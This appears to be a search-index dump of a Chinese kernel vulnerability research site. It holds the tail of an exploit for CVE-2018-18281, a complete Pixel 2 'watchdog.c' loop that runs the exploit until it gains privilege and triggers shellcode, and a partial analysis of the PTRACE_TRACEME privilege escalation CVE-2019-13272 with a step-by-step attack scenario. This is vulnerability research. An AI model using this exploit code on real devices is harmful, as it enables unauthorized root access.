(!bumped) {\n        if (write(spinner_cont_pipe[1], \"x\", 1) != 1)\n          errx(1, \"spinner_cont_pipe\");\n\n        bumped = 1;\n      }\n\n      orig = nsize;\n    }\n  }\n\n  pause();\n}\n\nint main(int argc, char** argv)\n{\n    kickout_victim_page();\n    trigger();\n}",
            "title": "exp.c"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/#watchdogc",
            "text": "// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n// 20190304, chengjia4574@gmail.com\n// code is from Jann Horn\n\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <sys/syscall.h>\n#include <pthread.h>\n#include <sched.h>\n#include <err.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/time.h>\n#include <errno.h>\n#include <sys/prctl.h>\n#include <signal.h>\n\nvoid gethost(){\n    char host[64];\n    int ret = -1;\n    ret = gethostname(host, 64);\n    if(!ret)\n        printf(\"read hostname : %s\\n\", host);\n}\n\nvoid sethost(){\n    char *h = \"jiayy-hostname\";\n    int ret = -1;\n    ret = syscall(__NR_sethostname, h, strlen(h));\n    if(!ret)\n        printf(\"success \\n\");\n    else\n        perror(\"errno \\n\");\n\n}\n\n\nvoid signal_handler(int signo) {\n    if (signo == SIGCHLD) {\n        pid_t pid;\n        while ((pid = waitpid(-1, NULL, WNOHANG)) > 0) {\n            printf(\"SIGCHLD pid %d\\n\", pid);\n        }\n    }\n}\n\nvoid runexp() {\n        pid_t pid;\n    const char*  envs[] = {\"LD_LIBRARY_PATH=/vendor/lib64:/system/lib64\",\"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\",NULL};\n    const char*  args[] = {\"/system/bin/sh\",\"-c\",\"/data/local/tmp/exp\", NULL};\n\n        if((pid = fork()) < 0)\n                return;\n    else if(pid == 0)\n        execve(\"/system/bin/sh\", (char**)args, (char**)envs);\n\n    wait(pid);\n}\n\nvoid waitupanyapp() {\n        pid_t pid;\n    const char*  envs[] = {\"LD_LIBRARY_PATH=/vendor/lib64:/system/lib64\",\"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\",NULL};\n    const char*  args[] = {\"/system/bin/am\",\"start\",\"-n\",\"com.android.chrome/com.google.android.apps.chrome.Main\", NULL};\n\n        if((pid = fork()) < 0)\n                return;\n    else if(pid == 0)\n        execve(\"/system/bin/am\", (char**)args, (char**)envs);\n\n    wait(pid);\n}\n\n\nint main(int argc, char** argv)\n{\n    gethost();\n    if(access(\"/data/local/tmp/exp\",F_OK) != 0) {\n        printf(\"/data/local/tmp/exp not exist!\\n\");\n        exit(0);\n    }\n    if(access(\"/data/local/tmp/succ\",F_OK) == 0) {\n        unlink(\"/data/local/tmp/succ\");\n    }\n\n    while(1) {\n        runexp();\n        if(access(\"/data/local/tmp/succ\",F_OK) == 0) {\n            break;\n        }\n    }\n    printf(\"STAGE 2, you need to open an app to trigger shellcode(any app is ok), then you can run hostname to see if it prints u:r:zygote:s0\\n\"); \n    getchar();\n    gethost();\n}",
            "title": "watchdog.c"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/",
            "text": "PTRACE_TRACEME \u672c\u5730\u63d0\u6743\u6f0f\u6d1e(CVE-2019-13272)\u89e3\u6790\n\n\n0.\u4f5c\u8005\n\n\nchengjia4574@gmail.com from iceswordlab\n\n\n1.\u80cc\u666f\u4ecb\u7ecd\n\n\na.\u4ec0\u4e48\u8f6f\u4ef6\u7684\u6f0f\u6d1e\n\n\nlinux kernel ptrace \u5b50\u6a21\u5757\n\n\nb.\u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7b80\u4ecb\n\n\n\n\nptrace\n \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u65b9\u6cd5\u6765\u8ba9\u8fdb\u7a0b (tracer) \u53ef\u4ee5\u89c2\u5bdf\u548c\u63a7\u5236\u5176\u5b83\u8fdb\u7a0b (tracee) \u7684\u6267\u884c\uff0c\u68c0\u67e5\u548c\u6539\u53d8\u5176\u6838\u5fc3\u6620\u50cf\u4ee5\u53ca\u5bc4\u5b58\u5668, \u4e3b\u8981\u7528\u6765\u5b9e\u73b0\u65ad\u70b9\u8c03\u8bd5\u548c\u7cfb\u7edf\u8c03\u7528\u8ddf\u8e2a\n\n\n\n\nc.\u6f0f\u6d1e\u80fd\u9020\u6210\u4ec0\u4e48\u5371\u5bb3\n\n\n\u6743\u9650\u63d0\u5347\n\n\nd.\u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6\n\n\n\n\nsetuid executable\n \n\n\neuid\n\n\nexec\n \n\n\nsetuid \u4f4d\n \n\n\nTOCTOU\n \n\n\npkexec\n \n\n\npolkit\n \n\n\n\n\n2.\u6f0f\u6d1e\u5206\u6790\n\n\na.\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec\n\n\nptrace \u8c03\u7528\u8fc7\u7a0b\u4e2d\u5185\u6838\u5173\u4e8e\u6743\u9650 cred \u7684\u4f7f\u7528\u6709\u903b\u8f91\u9519\u8bef\n\n\n\u672c\u8d28\u4e0a\u8fd9\u4e2a\u6f0f\u6d1e\u6709\u70b9\u50cf \nTOCTOU\n \u7c7b\u6f0f\u6d1e, ptracer_cred \u7684\u83b7\u53d6\u662f\u5728 traceme \u9636\u6bb5,  \u800c ptracer_cred \u7684\u5e94\u7528\u662f\u5728\u968f\u540e\u7684\u5404\u79cd request \u9636\u6bb5\uff0c \u800c\u5728\u968f\u540e\u7684 ptrace request \u7684\u65f6\u5019\uff0c tracer \u7684 cred \u53ef\u80fd\u5df2\u7ecf\u4e0d\u662f\u4e00\u5f00\u59cb\u5efa\u7acb trace link \u65f6\u7684\u90a3\u4e2a cred \u4e86\n\n\nb.\u6f0f\u6d1e\u539f\u7406\n\n\n   1    396  kernel/ptrace.c <<ptrace_attach>>\n             ptrace_link(task, current);  // link \u7684\u53cc\u65b9\u5206\u522b\u662f\u8981 trace \u7684\u76ee\u6807\u8fdb\u7a0b 'task' \n                      //  \u548c\u53d1\u52a8 trace \u7684\u5f53\u524d\u8fdb\u7a0b 'current'\n   2    469  kernel/ptrace.c <<ptrace_traceme>>\n             ptrace_link(current, current->real_parent);  // link \u7684\u53cc\u65b9\u5206\u522b\u662f\u53d1\u52a8 trace \u7684\n                              // \u5f53\u524d\u8fdb\u7a0b \u2018current\u2019 \u548c\u5f53\u524d\u8fdb\u7a0b\u7684\n                              // \u7236\u8fdb\u7a0b ' current->real_parent'\n\n\n\n\ntrace \u5173\u7cfb\u7684\u5efa\u7acb\u6709 2 \u79cd\u65b9\u5f0f\n\n\n\n\n1 \u662f\u8fdb\u7a0b\u8c03\u7528 fork \u51fd\u6570\u7136\u540e\u5b50\u8fdb\u7a0b\u4e3b\u52a8\u8c03\u7528 PTRACE_TRACEME, \u8fd9\u662f\u7531 tracee \u53d1\u8d77\u7684, \u5bf9\u5e94\u5185\u6838\u51fd\u6570 ptrace_traceme\n\n\n2 \u662f\u8fdb\u7a0b\u8c03\u7528 PTRACE_ATTACH \u6216\u8005 PTRACE_SEIZE \u53bb\u4e3b\u52a8 trace \u5176\u4ed6\u8fdb\u7a0b, \u8fd9\u662f\u7531 tracer \u53d1\u8d77\u7684, \u5bf9\u5e94\u5185\u6838\u51fd\u6570 ptrace_attach\n\n\n\n\n\u4e0d\u7ba1\u662f\u54ea\u79cd\u65b9\u5f0f\uff0c\u6700\u540e\u90fd\u4f1a\u8c03\u7528 ptrace_link \u51fd\u6570\u53bb\u5efa\u7acb tracer \u548c tracee \u4e4b\u95f4\u7684 trace \u5173\u7cfb\n\n\n\n\nptrace_attach \u5173\u8054\u7684\u53cc\u65b9\u662f 'task' (tracee) \u548c 'current' (tracer) \n\n\nptrace_traceme \u5173\u8054\u7684\u53cc\u65b9\u662f 'current' (tracee) \u548c 'current->real_parent' (tracer)\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u8981\u4ed4\u7ec6\u8bb0\u4f4f\u4e0a\u9762 2 \u79cd\u6a21\u5f0f\u4e0b tracer \u548c tracee \u5206\u522b\u662f\u4ec0\u4e48\uff0c\u56e0\u4e3a\u8fd9\u5c31\u662f\u6f0f\u6d1e\u7684\u5173\u952e\n\n\nstatic void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n{\n        rcu_read_lock();\n        __ptrace_link(child, new_parent, __task_cred(new_parent));\n        rcu_read_unlock();\n}\n\nvoid __ptrace_link(struct task_struct *child, struct task_struct *new_parent,\n                   const struct cred *ptracer_cred)\n{\n        BUG_ON(!list_empty(&child->ptrace_entry));\n        list_add(&child->ptrace_entry, &new_parent->ptraced); // 1. \u5c06\u81ea\u5df1\u52a0\u5165\u7236\u8fdb\u7a0b\u7684 ptraced \u961f\u5217\n        child->parent = new_parent; // 2. \u5c06\u7236\u8fdb\u7a0b\u5730\u5740\u4fdd\u5b58\u5728 parent \u6307\u9488\n        child->ptracer_cred = get_cred(ptracer_cred); // 3. \u4fdd\u5b58 ptracer_cred, \u6211\u4eec\u53ea\u5173\u6ce8\u8fd9\u4e2a\u53d8\u91cf\n}\n\n\n\n\n\u5efa\u7acb trace \u5173\u7cfb\u7684\u5173\u952e\u662f\u7531 tracee \u8bb0\u5f55 tracer \u7684 cred, \u4fdd\u5b58\u5728 tracee \u7684 'ptracer_cred' \u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u540d\u5f88\u987e\u540d\u601d\u4e49\n\n\nptracer_cred \u8fd9\u4e2a\u6982\u5ff5\u662f\u7531 2016 \u5e74\u7684\u4e00\u4e2a\u8865\u4e01 \nptrace: Capture the ptracer's creds not PT_PTRACE_CAP\n \u5f15\u5165\u7684, \u5f15\u5165 ptracer_cred \u7684\u76ee\u7684\u662f\u7528\u4e8e\u5f53 tracee \u6267\u884c exec \u53bb\u52a0\u8f7d \nsetuid executable\n \u65f6\u505a\u5b89\u5168\u68c0\u6d4b\n\n\n\u4e3a\u4ec0\u4e48\u9700\u8981\u8fd9\u4e2a\u5b89\u5168\u68c0\u6d4b\u5462?\n\n\nexec\n \u51fd\u6570\u65cf\u53ef\u4ee5\u66f4\u65b0\u8fdb\u7a0b\u7684\u955c\u50cf, \u5982\u679c\u88ab\u6267\u884c\u6587\u4ef6\u7684 \nsetuid \u4f4d\n \u7f6e\u4f4d\uff0c\u5219\u8fd0\u884c\u8fd9\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u65f6\uff0c\u8fdb\u7a0b\u7684 \neuid\n \u4f1a\u88ab\u4fee\u6539\u6210\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684 uid, \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u8005\u6743\u9650\u6bd4\u8c03\u7528 exec \u7684\u8fdb\u7a0b\u9ad8, \u8fd0\u884c\u8fd9\u7c7b \nsetuid executable\n \u4f1a\u6709\u63d0\u6743\u7684\u6548\u679c\n\n\n\u5047\u5982\u6267\u884c exec \u7684\u8fdb\u7a0b\u672c\u8eab\u662f\u4e00\u4e2a tracee, \u5f53\u5b83\u6267\u884c\u4e86 \nsetuid executable\n \u63d0\u6743\u4e4b\u540e\uff0c\u7531\u4e8e tracer \u53ef\u4ee5\u968f\u65f6\u4fee\u6539 tracee \u7684\u5bc4\u5b58\u5668\u548c\u5185\u5b58\uff0c\u8fd9\u65f6\u5019\u4f4e\u6743\u9650\u7684 tracer \u5c31\u53ef\u4ee5\u63a7\u5236 tracee \u53bb\u6267\u884c\u8d8a\u6743\u64cd\u4f5c\n\n\n\u4f5c\u4e3a\u5185\u6838\uff0c\u663e\u7136\u662f\u4e0d\u5141\u8bb8\u8fd9\u6837\u7684\u8d8a\u6743\u884c\u4e3a\u5b58\u5728\u7684\uff0c\u6240\u4ee5\u5f53 trace \u5173\u7cfb\u5efa\u7acb\u65f6, tracee \u9700\u8981\u4fdd\u5b58 tracer \u7684 cred (\u5373 ptracer_cred), \u7136\u540e\u5728\u6267\u884c exec \u8fc7\u7a0b\u4e2d, \u5982\u679c\u53d1\u73b0\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u662f \nsetuid \u4f4d\n \u7f6e\u4f4d\u7684\uff0c \u5219\u4f1a\u5224\u65ad 'ptracer_cred' \u7684\u6743\u9650\uff0c \u5982\u679c\u6743\u9650\u4e0d\u6ee1\u8db3\uff0c\u5c06\u4e0d\u4f1a\u6267\u884c  \nsetuid \u4f4d\n \u7684\u63d0\u6743\uff0c \u800c\u662f\u4ee5\u539f\u6709\u7684\u8fdb\u7a0b\u6743\u9650\u6267\u884c\u8fd9\u4e2a  \nsetuid executable\n \n\n\n\u8fd9\u4e2a\u8fc7\u7a0b\u7684\u4ee3\u7801\u5206\u6790\u5982\u4e0b(\u672c\u6587\u7684\u4ee3\u7801\u5206\u6790\u57fa\u4e8e v4.19-rc8)\n\n\ndo_execve\n  -> __do_execve_file\n  -> prepare_binprm \n      -> bprm_fill_uid\n      -> security_bprm_set_creds\n          ->cap_bprm_set_creds\n        -> ptracer_capable\n          ->selinux_bprm_set_creds\n          ->(apparmor_bprm_set_creds)\n          ->(smack_bprm_set_creds)\n          ->(tomoyo_bprm_set_creds)\n\n\n\n\n\u5982\u4e0a\uff0cexecve \u6743\u9650\u76f8\u5173\u7684\u64cd\u4f5c\u4e3b\u8981\u5728\u51fd\u6570 \u2018prepare_binprm\u2019 \u91cc\n\n\n    1567 int prepare_binprm(struct linux_binprm *bprm)\n    1568 {\n    1569         int retval;\n    1570         loff_t pos = 0;\n    1571 \n    1572         bprm_fill_uid(bprm); // <-- \u521d\u6b65\u586b\u5145\u65b0\u8fdb\u7a0b\u7684 cred\n    1573 \n    1574         /* fill in binprm security blob */\n    1575         retval = security_bprm_set_creds(bprm); // <-- \u5b89\u5168\u68c0\u6d4b\uff0c   \n                             // \u53ef\u80fd\u4f1a\u4fee\u6539\u65b0\u8fdb\u7a0b\u7684 cred\n    1576         if (retval)\n    1577                 return retval;\n    1578         bprm->called_set_creds = 1;\n    1579 \n    1580         memset(bprm->buf, 0, BINPRM_BUF_SIZE);\n    1581         return kernel_read(bprm->file, bprm->buf, BINPRM_BUF_SIZE, &pos);\n    1582 }\n\n\n\n\n\u5982\u4e0a\uff0c\u5148\u8c03\u7528 'bprm_fill_uid' \u521d\u6b65\u586b\u5145\u65b0\u8fdb\u7a0b\u7684 cred, \u518d\u8c03\u7528 'security_bprm_set_creds' \u505a\u5b89\u5168\u68c0\u6d4b\u5e76\u4fee\u6539\u65b0\u7684 cred\n\n\n    1509 static void bprm_fill_uid(struct linux_binprm *bprm)\n    1510 {\n    1511         struct inode *inode;\n    1512         unsigned int mode;\n    1513         kuid_t uid;\n    1514         kgid_t gid;\n    1515 \n    1516         /*\n    1517          * Since this can be called multiple times (via prepare_binprm),\n    1518          * we must clear any previous work done when setting set[ug]id\n    1519          * bits from any earlier bprm->file uses (for example when run\n    1520          * first for a setuid script then again for its interpreter).\n    1521          */\n    1522         bprm->cred->euid = current_euid(); // <--- \u5148\u4f7f\u7528\u672c\u8fdb\u7a0b\u7684euid\n    1523         bprm->cred->egid = current_egid();\n    1524 \n    1525         if (!mnt_may_suid(bprm->file->f_path.mnt))\n    1526                 return;\n    1527 \n    1528         if (task_no_new_privs(current))\n    1529                 return;\n    1530 \n    1531         inode = bprm->file->f_path.dentry->d_inode;\n    1532         mode = READ_ONCE(inode->i_mode);\n    1533         if (!(mode & (S_ISUID|S_ISGID))) // <---------- \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709 setuid/setgid \u4f4d\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u8fd4\u56de\u4e86\n    1534                 return;\n    1535 \n    1536         /* Be careful if suid/sgid is set */\n    1537         inode_lock(inode);\n    1538 \n    1539         /* reload atomically mode/uid/gid now that lock held */\n    1540         mode = inode->i_mode;\n    1541         uid = inode->i_uid; // <---- \u5982\u679c\u6587\u4ef6 S_ISUID \u7f6e\u4f4d\uff0c\u4f7f\u7528\u6587\u4ef6\u7684 i_uid\n    1542         gid = inode->i_gid;\n    1543         inode_unlock(inode);\n    1544 \n    1545         /* We ignore suid/sgid if there are no mappings for them in the ns */\n    1546         if (!kuid_has_mapping(bprm->cred->user_ns, uid) ||\n    1547                  !kgid_has_mapping(bprm->cred->user_ns, gid))\n    1548                 return;\n    1549 \n    1550         if (mode & S_ISUID) {\n    1551                 bprm->per_clear |= PER_CLEAR_ON_SETID;\n    1552                 bprm->cred->euid = uid; // <------ \u4f7f\u7528\u6587\u4ef6\u7684 i_uid \u4f5c\u4e3a\u65b0\u8fdb\u7a0b\u7684 euid\n    1553         }\n    1554 \n    1555         if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) {\n    1556                 bprm->per_clear |= PER_CLEAR_ON_SETID;\n    1557                 bprm->cred->egid = gid;\n    1558         }\n    1559 }\n\n\n\n\n\n\u5982\u4e0a\uff0c \u4e3b\u8981\u770b\u4e24\u884c\n\n\n\n\n1522 \u884c, \u5c06\u5f53\u524d\u7684 euid \u8d4b\u503c\u65b0\u7684 euid, \u6240\u4ee5\u5927\u90e8\u5206\u6267\u884c\u4e86 execve \u7684\u8fdb\u7a0b\u7684\u6743\u9650\u8ddf\u539f\u6765\u7684\u4e00\u6837\n\n\n1552 \u884c\uff0c\u5982\u679c\u5e26\u6709 suid bit, \u5219\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684 uid \u8d4b\u503c\u65b0\u7684 euid, \u8fd9\u5c31\u662f\u6240\u8c13 setuid \u7684\u5b9e\u73b0\uff0c \u65b0\u7684 euid \u53d8\u6210\u4e86\u5b83\u6267\u884c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6240\u6709\u8005\u7684 uid\uff0c \u5982\u679c\u6240\u6709\u8005\u662f\u7279\u6743\u7528\u6237\uff0c \u8fd9\u91cc\u5c31\u5b9e\u73b0\u4e86\u63d0\u6743\n\n\n\n\n\u4f46\u662f\uff0c\u8fd9\u91cc\u7684 euid \u4f9d\u7136\u4e0d\u662f\u6700\u7ec8\u7684\u7ed3\u679c\uff0c \u8fd8\u9700\u8981\u8fdb\u5165\u51fd\u6570 security_bprm_set_creds \u505a\u8fdb\u4e00\u6b65\u7684\u5b89\u5168\u68c0\u6d4b\n\n\nsecurity_bprm_set_creds \u51fd\u6570\u8c03\u7528\u7684\u662f \nLSM\n \u6846\u67b6\n\n\n\u5728\u6211\u5206\u6790\u7684\u5185\u6838\u7248\u672c\u4e0a, \u5b9e\u73b0 'bprm_set_creds' \u8fd9\u4e2a hook \u70b9\u5b89\u5168\u68c0\u6d4b\u7684 lsm \u6846\u67b6\u6709 5 \u79cd, \u68c0\u6d4b\u51fd\u6570\u5982\u4e0b, \n\n\n\n\ncap_bprm_set_creds\n\n\nselinux_bprm_set_creds\n\n\napparmor_bprm_set_creds\n\n\nsmack_bprm_set_creds\n\n\ntomoyo_bprm_set_creds\n\n\n\n\n\u8fd9\u91cc\u54ea\u4e9b hook \u68c0\u6d4b\u51fd\u6570\u4f1a\u88ab\u6267\u884c\uff0c\u5176\u5b9e\u662f\u8ddf\u5177\u4f53\u7684\u5185\u6838\u914d\u7f6e\u6709\u5173\u7684, \u7406\u8bba\u4e0a\u628a\u6240\u6709 lsm \u6846\u67b6\u90fd\u542f\u7528\u7684\u8bdd\uff0c\u4e0a\u8ff0\u6240\u6709\u8fd9\u4e9b\u5b9e\u73b0\u4e86 'bprm_set_creds' hook \u68c0\u6d4b\u7684\u51fd\u6570\u90fd\u4f1a\u88ab\u6267\u884c \n\n\n\u5728\u6211\u7684\u5206\u6790\u73af\u5883\u91cc\u5b9e\u9645\u8fd0\u884c\u7684\u68c0\u6d4b\u51fd\u6570\u53ea\u6709 cap_bprm_set_creds \u548c selinux_bprm_set_creds \u8fd9\u4fe9\n\n\n\u5176\u4e2d\uff0c \u5bf9 euid \u6709\u5f71\u54cd\u7684\u662f 'cap_bprm_set_creds' \u8fd9\u4e2a\u51fd\u6570\n\n\n    815 int cap_bprm_set_creds(struct linux_binprm *bprm)\n    816 {\n    817         const struct cred *old = current_cred();\n    818         struct cred *new = bprm->cred;\n    819         bool effective = false, has_fcap = false, is_setid;\n    820         int ret;\n    821         kuid_t root_uid;\n    ===================== skip ======================\n    838         /* Don't let someone trace a set[ug]id/setpcap binary with the revised\n    839          * credentials unless they have the appropriate permit.\n    840          *\n    841          * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.\n    842          */\n    843         is_setid = __is_setuid(new, old) || __is_setgid(new, old);  \n    844 \n    845         if ((is_setid || __cap_gained(permitted, new, old)) && // <---- \u68c0\u6d4b\u662f\u5426\u6267\u884c\u7684\u662f setid \u7a0b\u5e8f\n    846             ((bprm->unsafe & ~LSM_UNSAFE_PTRACE) || \n    847              !ptracer_capable(current, new->user_ns))) { // <----- \u5982\u679c\u6267\u884cexecve\u7684\u8fdb\u7a0b\u88abtrace\u4e86\uff0c\u4e14\u6267\u884c\u7684\u7a0b\u5e8f\u662f setuid \u7684\uff0c\u9700\u8981\u589e\u52a0\u6743\u9650\u68c0\u6d4b\n    848                 /* downgrade; they get no more than they had, and maybe less */\n    849                 if (!ns_capable(new->user_ns, CAP_SETUID) ||\n    850                     (bprm->unsafe & LSM_UNSAFE_NO_NEW_PRIVS)) {\n    851                         new->euid = new->uid; // <----- \u5982\u679c\u68c0\u6d4b\u4e0d\u901a\u8fc7\uff0c\u4f1a\u5c06\u65b0\u8fdb\u7a0b\u7684 euid \u91cd\u65b0\u8bbe\u7f6e\u4e3a\u539f\u8fdb\u7a0b\u7684 uid\n    852                         new->egid = new->gid;\n    853                 }\n    854                 new->cap_permitted = cap_intersect(new->cap_permitted,\n    855                                                    old->cap_permitted);\n    856         }\n    857 \n    858         new->suid = new->fsuid = new->euid;\n    859         new->sgid = new->fsgid = new->egid;\n    ===================== skip ======================\n}\n\n\n\n\n\u5982\u4e0a\n\n\n\n\n\u884c 845, \u68c0\u6d4b euid \u662f\u5426\u8ddf\u539f\u6709\u7684 uid \u4e0d\u4e00\u81f4 (\u5728\u51fd\u6570 bprm_fill_uid \u5206\u6790\u91cc\u6211\u4eec\u77e5\u9053\uff0c\u5982\u679c\u6267\u884c\u7684\u6587\u4ef6\u662f setuid bit \u7684\uff0c euid \u5c31\u4f1a\u4e0d\u4e00\u81f4)\n      \u6240\u4ee5\u8fd9\u91cc\u7b49\u540c\u4e8e\u68c0\u6d4b\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u662f\u4e0d\u662f setid \u7a0b\u5e8f\n\n\n\u884c 847, \u68c0\u6d4b\u672c\u8fdb\u7a0b\u662f\u5426\u662f tracee \n\n\n\n\n\u5982\u679c\u4e24\u4e2a\u6761\u4ef6\u540c\u65f6\u6ee1\u8db3\uff0c\u9700\u8981\u6267\u884c ptracer_capable \u51fd\u6570\u8fdb\u884c\u6743\u9650\u68c0\u6d4b\uff0c\u5047\u8bbe\u68c0\u6d4b\u4e0d\u901a\u8fc7\uff0c \u4f1a\u6267\u884c downgrade \u964d\u6743\n\n\n\n\n\u884c 851, \u5c06 new->euid \u7684\u503c\u91cd\u65b0\u53d8\u6210 new->uid\uff0c \u5c31\u662f\u8bf4\u5728\u51fd\u6570 bprm_fill_uid \u91cc\u63d0\u7684\u6743\u5728\u8fd9\u91cc\u53ef\u80fd\u53c8\u88ab\u964d\u56de\u53bb\n\n\n\n\n    499 bool ptracer_capable(struct task_struct *tsk, struct user_namespace *ns)\n    500 {\n    501         int ret = 0;  /* An absent tracer adds no restrictions */\n    502         const struct cred *cred;\n    503         rcu_read_lock();\n    504         cred = rcu_dereference(tsk->ptracer_cred); // <----- \u53d6\u51fa ptrace_link \u65f6\u4fdd\u5b58\u7684 ptracer_cred \n    505         if (cred)\n    506                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE); // <-------- \u8fdb\u5165 lsm \u6846\u67b6\u8fdb\u884c\u5b89\u5168\u68c0\u6d4b\n    507         rcu_read_unlock();\n    508         return (ret == 0);\n    509 }\n\n\n\n\n\u5982\u4e0a\uff0c \n\n\n\n\n\u884c 504, \u53d6\u51fa 'tsk->ptracer_cred' \n\n\n\u884c 506, \u8fdb\u5165 lsm \u6846\u67b6\u5bf9 \u2018tsk->ptracer_cred\u2019 \u8fdb\u884c\u68c0\u6d4b\n\n\n\n\n\u5230\u4e86\u8fd9\u91cc\uff0c \u8fd9\u4e2a\u6f0f\u6d1e\u6d89\u53ca\u5230\u7684\u53d8\u91cf \u2018tsk->ptracer_cred\u2019 \u7ec8\u4e8e\u51fa\u73b0\u4e86\uff0c \u5982\u524d\u6240\u8ff0\uff0c\u8fd9\u4e2a\u53d8\u91cf\u662f\u5efa\u7acb trace \u5173\u7cfb\u65f6\uff0c tracee \u4fdd\u5b58\u7684 tracer \u7684 cred\n\n\n\u5f53 tracee \u968f\u540e\u6267\u884c execve \u53bb\u6267\u884c suid \u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 ptracer_capable \u8fd9\u4e2a\u51fd\u6570\uff0c \u901a\u8fc7 lsm \u91cc\u7684\u5b89\u5168\u6846\u67b6\u53bb\u5224\u65ad \u2018ptracer_cred\u2019 \u7684\u6743\u9650\n\n\nlsm \u6846\u67b6\u91cc\u7684 capable hook \u68c0\u6d4b\u6211\u4eec\u8fd9\u91cc\u4e0d\u5206\u6790\u4e86\uff0c \u7b80\u5355\u6765\u8bf4\uff0c \u5982\u679c tracer \u672c\u8eab\u662f root \u6743\u9650\uff0c \u5219\u8fd9\u91cc\u7684\u68c0\u6d4b\u4f1a\u901a\u8fc7\uff0c \u5982\u679c\u4e0d\u662f\uff0c \u5c31\u4f1a\u8fd4\u56de\u5931\u8d25\n\n\n\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u5982\u679c  ptracer_capable \u68c0\u6d4b\u5931\u8d25\uff0c new->euid \u7684\u6743\u9650\u4f1a\u88ab\u964d\u56de\u53bb\n\n\n\u4e3e\u4e2a\u4f8b\u5b50\uff0c A ptrace B , B execve \u6267\u884c '/usr/bin/passwd', \u6839\u636e\u4e0a\u9762\u4ee3\u7801\u7684\u5206\u6790\uff0c \u5982\u679c A \u662f root \u6743\u9650\uff0c \u5219 B \u6267\u884c passwd \u65f6\u7684 euid \u662f root, \u5426\u5219\u5c31\u8fd8\u662f\u539f\u6709\u7684\u6743\u9650\n\n\nkernel/ptrace.c <<ptrace_traceme>>\n             ptrace_link(current, current->real_parent);  \n\nstatic void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n{\n        rcu_read_lock();\n        __ptrace_link(child, new_parent, __task_cred(new_parent));\n        rcu_read_unlock();\n}\n\n\n\n\n\u56de\u5230\u6f0f\u6d1e\u4ee3\u7801, \u4e3a\u4ec0\u4e48 traceme \u5728\u5efa\u7acb trace link \u65f6\u8bb0\u5f55 parent \u7684 cred \u662f\u4e0d\u5bf9\u7684\u5462?  \u660e\u660e\u8fd9\u65f6\u5019 parent \u5c31\u662f tracer \u554a?\n\n\n\u6211\u4eec\u7528 Jann Horn \u4e3e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e3a\u4ec0\u4e48 traceme \u8fd9\u79cd\u65b9\u5f0f\u5efa\u7acb trace link \u65f6\u4e0d\u80fd\u4f7f\u7528 tracer \u7684 cred\n\n\n - 1, task A: fork()s a child, task B\n - 2, task B: fork()s a child, task C\n - 3, task B: execve(/some/special/suid/binary)\n - 4, task C: PTRACE_TRACEME (creates privileged ptrace relationship)\n - 5, task C: execve(/usr/bin/passwd)\n - 6, task B: drop privileges (setresuid(getuid(), getuid(), getuid()))\n - 7, task B: become dumpable again (e.g. execve(/some/other/binary))\n - 8, task A: PTRACE_ATTACH to task B\n - 9, task A: use ptrace to take control of task B\n - 10, task B: use ptrace to take control of task C\n\n\n\n\n\u5982\u4e0a\u573a\u666f\u6709 3 \u4e2a\u8fdb\u7a0b A, B, C\n\n\n\n\n\u7b2c 4 \u6b65\uff0c task C \u4f7f\u7528 PTRACE_TRACE \u5efa\u7acb\u8ddf B \u7684 trace link \u65f6\uff0c \u7531\u4e8e B \u6b64\u65f6\u662f euid = 0 (\u56e0\u4e3a\u5b83\u521a\u521a\u6267\u884c\u4e86 suid binary), \u6240\u4ee5 C \u8bb0\u5f55\u7684 ptracer_cred \u7684 euid \u4e5f\u662f 0 \n\n\n\u7b2c 5 \u6b65\uff0c task C \u968f\u540e\u6267\u884c execve(suid binary), \u6839\u636e\u6211\u4eec\u4e0a\u9762\u7684\u5206\u6790\uff0c\u7531\u4e8e C \u7684 ptracer_cred \u662f\u7279\u6743\u7684\uff0c \u6240\u4ee5 ptracer_capable \u51fd\u6570\u68c0\u6d4b\u901a\u8fc7\uff0c\u6240\u4ee5\u6267\u884c\u5b8c execve \u540e\uff0c task C \u7684 euid \u4e5f\u63d0\u6743\u6210 0 , \u6ce8\u610f\u6b64\u65f6 B \u548c C \u7684 trace link \u8fd8\u662f\u6709\u6548\u7684\n\n\n\u7b2c 6 \u6b65\uff0c task B \u6267\u884c setresuid \u5c06\u81ea\u5df1\u964d\u6743\uff0c \u8fd9\u4e2a\u964d\u6743\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u80fd\u8ba9 task A attach\n\n\n\u7b2c 8 \u6b65\uff0c 